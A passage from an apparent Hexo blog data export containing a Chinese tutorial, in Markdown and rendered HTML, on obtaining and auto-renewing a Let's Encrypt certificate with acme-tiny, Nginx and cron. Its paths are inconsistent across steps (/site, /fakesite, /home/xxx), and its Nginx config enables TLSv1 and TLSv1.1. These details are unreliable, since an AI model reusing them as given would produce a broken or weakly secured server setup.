reload\n```\n\n更新的大致过程是，运行python脚本再次更新`signed.crt`申请证书文件，再进行证书合并写入`chained.pem`文件。\n\n然后给这个文件赋予 可执行 属性\n\n```shell\nchmod +x /fakesite_cert/renew_cert.sh\n```\n\n使用`crontab -e`指令打开定时任务配置文件，并加入以下内容。\n\n```\n0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1\n```\n\n对于上面指令的具体意思请自行搜索`crontab`命令\n\n### 完工\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Let's Encrypt，免费好用的 HTTPS 证书]:https://imququ.com/post/letsencrypt-certificate.html\n[linux 使用openssl报找不到/usr/lib/ssl/openssl.cnf的解决办法]:https://blog.csdn.net/hjxdreamer/article/details/103296944\n\n","source":"_posts/Let's Encrypt 免费Https证书.md","raw":"---\ntitle: Let s Encrypt 免费Https证书\ndate: 2020-09-03 15:30:37\ncategories: \n- 服务器\ntag: \n- Https证书\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120852.jpg\n---\n\n参考文章:[Let's Encrypt，免费好用的 HTTPS 证书][Let's Encrypt，免费好用的 HTTPS 证书]\n\n### 先放官网\n\n[Let's Encrypt](https://letsencrypt.org/)\n\n>[Let's Encrypt](https://letsencrypt.org/) 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛\n\n---\n\n#### 所需环境\n\n* 一个 HTTP 服务，以 Nginx 为例\n\n* python\n\n* 两个目录:\n\n  >/site\t网站目录\n  >\n  >/site_site_cert\t保存证书的目录\n\n**证书的颁发有两种方式：**\n\n#### 通过在线生成\n\n通过网址在线生成，需要验证文件\n\n#### 通过程序生成\n\n通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。\n\n我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let's Encrypt会对网站进行访问，下载密钥进行验证。\n\n---\n\n### 开工\n\n### 创建账号\n\n首先创建一个目录，我是在根目录下创建文件夹site_cert\n\n```shell\nmkdir /site_cert\n```\n\n这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let's Encrypt识别你的身份\n\n```shell\nopenssl genrsa 4096 > account.key\n```\n\n### 创建CSR文件\n\n在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）\n\n```shell\nopenssl genrsa 4096 > domain.key\n```\n\n我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧\n\n> RSA 私钥：兼容性好\n>\n> ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小\n\n两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 `www` 和不带 `www` 的两种情况都加进去，一张证书最多可以包含100个域名。\n\n```shell\nopenssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr\n```\n\n* 其中DNS的`yoursite.com`和`www.yoursite.com`记得要换成自己的域名\n\n我在这里遇到了问题提示找不到`/etc/ssl/openssl.cnf`文件，在网上找的的[解决办法][linux 使用openssl报找不到/usr/lib/ssl/openssl.cnf的解决办法]是\n\n执行 :\n\n```shell\nopenssl version -a\n```\n\n会输出openssl的信息，其中`OPENSSLDIR`对应的路径就是`openssl.cnf`文件的地址，自行将上面的`cat /etc/ssl/openssl.cnf`,改为自己的路径运行。\n\n### 配置验证服务\n\n前面介绍过了Let's Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。\n\n创建用于存放网站的目录site以及用于验证文件存放的子目录\n\n```shell\nmkdir -p /site/.well-known/acme-challenge/\n```\n\n然后再Nginx中配置:\n\n```nginx\nserver {\n    server_name www.yoursite.com yoursite.com;\n\n    location ^~ /.well-known/acme-challenge/ {\n        alias /home/xxx/www/challenges/;\n        try_files $uri =404;\n    }\n\n    location / {\n        rewrite ^/(.*)$ https://yoursite.com/$1 permanent;\n    }\n}\n```\n\n* 别忘了改`yoursite`\n\n这个配置会优先查找`/site`目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。\n\n### 获取网站证书\n\n先下载`acme-tiny`脚本到之前的site_cert目录：\n\n```shell\nwget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py\n```\n\n指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:\n\n```shell\npython acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ > ./signed.crt\n```\n\n执行成功的话会在当前目录生成一个`signed.crt`文件，这个文件就是申请好的证书文件。\n\n我在这里出现了错误提示\n\n```\nValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/blablabla\n```\n\n大概的意思就是，在网站目录里写入了一个验证文件，但是Let's Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：\n\n>[Hurricane Electric Free DNS](https://dns.he.net/)\n>\n>[ZoneEdit](https://www.zoneedit.com/)\n>\n>[CloudFlare](https://www.cloudflare.com/)\n\n这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。\n\n网站证书到手以后，还要下载 Let's Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：\n\n```shell\nwget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem\n\n\ncat signed.crt intermediate.pem > chained.pem\n```\n\n**最终**，在Nginx中添加证书配置，并reload，我的部分配置如下\n\n```nginx\nserver {\n   listen 443 ssl;\n   ssl_certificate       /site_cert/chained.pem;\n   ssl_certificate_key   /site_cert/domain.key;\n   ssl_protocols         TLSv1 TLSv1.1 TLSv1.2;\n   ssl_ciphers           HIGH:!aNULL:!MD5;\n   server_name           braindance.tk;\n   index index.html index.htm;\n   root \n        …………………………\n}\n```\n\n执行\n\n```shell\nnginx -s reload\n```\n\n### 证书自动更新 计划任务\n\n​\t至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。\n\n用 `vi` 在 `/site_cert` 文件夹 创建 计划任务脚本 `renew_cert.sh`\n\n```shell\nvi /site_cert/renew_cert.sh\n```\n\n通过`vi`输入以下内容\n\n```shell\n#!/bin/bash\n\ncd /fakesite_cert/\npython acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ > ./signed.crt || exit\nwget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem\ncat signed.crt intermediate.pem > chained.pem\nnginx -s reload\n```\n\n更新的大致过程是，运行python脚本再次更新`signed.crt`申请证书文件，再进行证书合并写入`chained.pem`文件。\n\n然后给这个文件赋予 可执行 属性\n\n```shell\nchmod +x /fakesite_cert/renew_cert.sh\n```\n\n使用`crontab -e`指令打开定时任务配置文件，并加入以下内容。\n\n```\n0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1\n```\n\n对于上面指令的具体意思请自行搜索`crontab`命令\n\n### 完工\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Let's Encrypt，免费好用的 HTTPS 证书]:https://imququ.com/post/letsencrypt-certificate.html\n[linux 使用openssl报找不到/usr/lib/ssl/openssl.cnf的解决办法]:https://blog.csdn.net/hjxdreamer/article/details/103296944\n\n","slug":"Let's Encrypt 免费Https证书","published":1,"updated":"2021-12-30T14:45:17.784Z","_id":"ckrr3f9ao0008hotc6esihd7c","comments":1,"layout":"post","photos":[],"link":"","content":"<p>参考文章:<a href=\"https://imququ.com/post/letsencrypt-certificate.html\">Let’s Encrypt，免费好用的 HTTPS 证书</a></p>\n<h3 id=\"先放官网\"><a href=\"#先放官网\" class=\"headerlink\" title=\"先放官网\"></a>先放官网</h3><p><a href=\"https://letsencrypt.org/\">Let’s Encrypt</a></p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/\">Let’s Encrypt</a> 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛</p>\n</blockquote>\n<hr>\n<h4 id=\"所需环境\"><a href=\"#所需环境\" class=\"headerlink\" title=\"所需环境\"></a>所需环境</h4><ul>\n<li><p>一个 HTTP 服务，以 Nginx 为例</p>\n</li>\n<li><p>python</p>\n</li>\n<li><p>两个目录:</p>\n<blockquote>\n<p>/site    网站目录</p>\n<p>/site_site_cert    保存证书的目录</p>\n</blockquote>\n</li>\n</ul>\n<p><strong>证书的颁发有两种方式：</strong></p>\n<h4 id=\"通过在线生成\"><a href=\"#通过在线生成\" class=\"headerlink\" title=\"通过在线生成\"></a>通过在线生成</h4><p>通过网址在线生成，需要验证文件</p>\n<h4 id=\"通过程序生成\"><a href=\"#通过程序生成\" class=\"headerlink\" title=\"通过程序生成\"></a>通过程序生成</h4><p>通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。</p>\n<p>我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。</p>\n<hr>\n<h3 id=\"开工\"><a href=\"#开工\" class=\"headerlink\" title=\"开工\"></a>开工</h3><h3 id=\"创建账号\"><a href=\"#创建账号\" class=\"headerlink\" title=\"创建账号\"></a>创建账号</h3><p>首先创建一个目录，我是在根目录下创建文件夹site_cert</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /site_cert</span><br></pre></td></tr></table></figure>\n\n<p>这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let’s Encrypt识别你的身份</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa 4096 &gt; account.key</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"创建CSR文件\"><a href=\"#创建CSR文件\" class=\"headerlink\" title=\"创建CSR文件\"></a>创建CSR文件</h3><p>在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa 4096 &gt; domain.key</span><br></pre></td></tr></table></figure>\n\n<p>我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧</p>\n<blockquote>\n<p>RSA 私钥：兼容性好</p>\n<p>ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小</p>\n</blockquote>\n<p>两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 <code>www</code> 和不带 <code>www</code> 的两种情况都加进去，一张证书最多可以包含100个域名。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -new -sha256 -key domain.key -subj &quot;/&quot; -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf &quot;[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com&quot;)) &gt; domain.csr</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>其中DNS的<code>yoursite.com</code>和<code>www.yoursite.com</code>记得要换成自己的域名</li>\n</ul>\n<p>我在这里遇到了问题提示找不到<code>/etc/ssl/openssl.cnf</code>文件，在网上找的的<a href=\"https://blog.csdn.net/hjxdreamer/article/details/103296944\">解决办法</a>是</p>\n<p>执行 :</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl version -a</span><br></pre></td></tr></table></figure>\n\n<p>会输出openssl的信息，其中<code>OPENSSLDIR</code>对应的路径就是<code>openssl.cnf</code>文件的地址，自行将上面的<code>cat /etc/ssl/openssl.cnf</code>,改为自己的路径运行。</p>\n<h3 id=\"配置验证服务\"><a href=\"#配置验证服务\" class=\"headerlink\" title=\"配置验证服务\"></a>配置验证服务</h3><p>前面介绍过了Let’s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。</p>\n<p>创建用于存放网站的目录site以及用于验证文件存放的子目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -p /site/.well-known/acme-challenge/</span><br></pre></td></tr></table></figure>\n\n<p>然后再Nginx中配置:</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.yoursite.com yoursite.com;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span><span class=\"regexp\"> ^~</span> /.well-known/acme-challenge/ &#123;</span><br><span class=\"line\">        <span class=\"attribute\">alias</span> /home/xxx/www/challenges/;</span><br><span class=\"line\">        <span class=\"attribute\">try_files</span> $uri =<span class=\"number\">404</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^/(.*)$</span> https://yoursite.com/<span class=\"variable\">$1</span> <span class=\"literal\">permanent</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>别忘了改<code>yoursite</code></li>\n</ul>\n<p>这个配置会优先查找<code>/site</code>目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。</p>\n<h3 id=\"获取网站证书\"><a href=\"#获取网站证书\" class=\"headerlink\" title=\"获取网站证书\"></a>获取网站证书</h3><p>先下载<code>acme-tiny</code>脚本到之前的site_cert目录：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py</span><br></pre></td></tr></table></figure>\n\n<p>指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt</span><br></pre></td></tr></table></figure>\n\n<p>执行成功的话会在当前目录生成一个<code>signed.crt</code>文件，这个文件就是申请好的证书文件。</p>\n<p>我在这里出现了错误提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn&#x27;t download http://www.yoursite.com/.well-known/acme-challenge/blablabla</span><br></pre></td></tr></table></figure>\n\n<p>大概的意思就是，在网站目录里写入了一个验证文件，但是Let’s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：</p>\n<blockquote>\n<p><a href=\"https://dns.he.net/\">Hurricane Electric Free DNS</a></p>\n<p><a href=\"https://www.zoneedit.com/\">ZoneEdit</a></p>\n<p><a href=\"https://www.cloudflare.com/\">CloudFlare</a></p>\n</blockquote>\n<p>这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。</p>\n<p>网站证书到手以后，还要下载 Let’s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cat signed.crt intermediate.pem &gt; chained.pem</span><br></pre></td></tr></table></figure>\n\n<p><strong>最终</strong>，在Nginx中添加证书配置，并reload，我的部分配置如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">   <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_certificate</span>       /site_cert/chained.pem;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_certificate_key</span>   /site_cert/domain.key;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_protocols</span>         TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_ciphers</span>           HIGH:!aNULL:!MD5;</span><br><span class=\"line\">   <span class=\"attribute\">server_name</span>           braindance.tk;</span><br><span class=\"line\">   <span class=\"attribute\">index</span> index.html index.htm;</span><br><span class=\"line\">   <span class=\"attribute\">root</span> </span><br><span class=\"line\">        …………………………</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"证书自动更新-计划任务\"><a href=\"#证书自动更新-计划任务\" class=\"headerlink\" title=\"证书自动更新 计划任务\"></a>证书自动更新 计划任务</h3><p>​    至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。</p>\n<p>用 <code>vi</code> 在 <code>/site_cert</code> 文件夹 创建 计划任务脚本 <code>renew_cert.sh</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /site_cert/renew_cert.sh</span><br></pre></td></tr></table></figure>\n\n<p>通过<code>vi</code>输入以下内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">cd /fakesite_cert/</span><br><span class=\"line\">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt || exit</span><br><span class=\"line\">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class=\"line\">cat signed.crt intermediate.pem &gt; chained.pem</span><br><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<p>更新的大致过程是，运行python脚本再次更新<code>signed.crt</code>申请证书文件，再进行证书合并写入<code>chained.pem</code>文件。</p>\n<p>然后给这个文件赋予 可执行 属性</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x /fakesite_cert/renew_cert.sh</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>crontab -e</code>指令打开定时任务配置文件，并加入以下内容。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 0 1 * * /home/xxx/shell/renew_cert.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>对于上面指令的具体意思请自行搜索<code>crontab</code>命令</p>\n<h3 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h3>","site":{"data":{}},"excerpt":"","more":"<p>参考文章:<a href=\"https://imququ.com/post/letsencrypt-certificate.html\">Let’s Encrypt，免费好用的 HTTPS 证书</a></p>\n<h3 id=\"先放官网\"><a href=\"#先放官网\" class=\"headerlink\" title=\"先放官网\"></a>先放官网</h3><p><a href=\"https://letsencrypt.org/\">Let’s Encrypt</a></p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/\">Let’s Encrypt</a> 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛</p>\n</blockquote>\n<hr>\n<h4 id=\"所需环境\"><a href=\"#所需环境\" class=\"headerlink\" title=\"所需环境\"></a>所需环境</h4><ul>\n<li><p>一个 HTTP 服务，以 Nginx 为例</p>\n</li>\n<li><p>python</p>\n</li>\n<li><p>两个目录:</p>\n<blockquote>\n<p>/site    网站目录</p>\n<p>/site_site_cert    保存证书的目录</p>\n</blockquote>\n</li>\n</ul>\n<p><strong>证书的颁发有两种方式：</strong></p>\n<h4 id=\"通过在线生成\"><a href=\"#通过在线生成\" class=\"headerlink\" title=\"通过在线生成\"></a>通过在线生成</h4><p>通过网址在线生成，需要验证文件</p>\n<h4 id=\"通过程序生成\"><a href=\"#通过程序生成\" class=\"headerlink\" title=\"通过程序生成\"></a>通过程序生成</h4><p>通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。</p>\n<p>我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。</p>\n<hr>\n<h3 id=\"开工\"><a href=\"#开工\" class=\"headerlink\" title=\"开工\"></a>开工</h3><h3 id=\"创建账号\"><a href=\"#创建账号\" class=\"headerlink\" title=\"创建账号\"></a>创建账号</h3><p>首先创建一个目录，我是在根目录下创建文件夹site_cert</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /site_cert</span><br></pre></td></tr></table></figure>\n\n<p>这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let’s Encrypt识别你的身份</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa 4096 &gt; account.key</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"创建CSR文件\"><a href=\"#创建CSR文件\" class=\"headerlink\" title=\"创建CSR文件\"></a>创建CSR文件</h3><p>在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa 4096 &gt; domain.key</span><br></pre></td></tr></table></figure>\n\n<p>我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧</p>\n<blockquote>\n<p>RSA 私钥：兼容性好</p>\n<p>ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小</p>\n</blockquote>\n<p>两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 <code>www</code> 和不带 <code>www</code> 的两种情况都加进去，一张证书最多可以包含100个域名。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -new -sha256 -key domain.key -subj &quot;/&quot; -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf &quot;[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com&quot;)) &gt; domain.csr</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>其中DNS的<code>yoursite.com</code>和<code>www.yoursite.com</code>记得要换成自己的域名</li>\n</ul>\n<p>我在这里遇到了问题提示找不到<code>/etc/ssl/openssl.cnf</code>文件，在网上找的的<a href=\"https://blog.csdn.net/hjxdreamer/article/details/103296944\">解决办法</a>是</p>\n<p>执行 :</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl version -a</span><br></pre></td></tr></table></figure>\n\n<p>会输出openssl的信息，其中<code>OPENSSLDIR</code>对应的路径就是<code>openssl.cnf</code>文件的地址，自行将上面的<code>cat /etc/ssl/openssl.cnf</code>,改为自己的路径运行。</p>\n<h3 id=\"配置验证服务\"><a href=\"#配置验证服务\" class=\"headerlink\" title=\"配置验证服务\"></a>配置验证服务</h3><p>前面介绍过了Let’s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。</p>\n<p>创建用于存放网站的目录site以及用于验证文件存放的子目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -p /site/.well-known/acme-challenge/</span><br></pre></td></tr></table></figure>\n\n<p>然后再Nginx中配置:</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.yoursite.com yoursite.com;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span><span class=\"regexp\"> ^~</span> /.well-known/acme-challenge/ &#123;</span><br><span class=\"line\">        <span class=\"attribute\">alias</span> /home/xxx/www/challenges/;</span><br><span class=\"line\">        <span class=\"attribute\">try_files</span> $uri =<span class=\"number\">404</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^/(.*)$</span> https://yoursite.com/<span class=\"variable\">$1</span> <span class=\"literal\">permanent</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>别忘了改<code>yoursite</code></li>\n</ul>\n<p>这个配置会优先查找<code>/site</code>目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。</p>\n<h3 id=\"获取网站证书\"><a href=\"#获取网站证书\" class=\"headerlink\" title=\"获取网站证书\"></a>获取网站证书</h3><p>先下载<code>acme-tiny</code>脚本到之前的site_cert目录：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py</span><br></pre></td></tr></table></figure>\n\n<p>指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt</span><br></pre></td></tr></table></figure>\n\n<p>执行成功的话会在当前目录生成一个<code>signed.crt</code>文件，这个文件就是申请好的证书文件。</p>\n<p>我在这里出现了错误提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn&#x27;t download 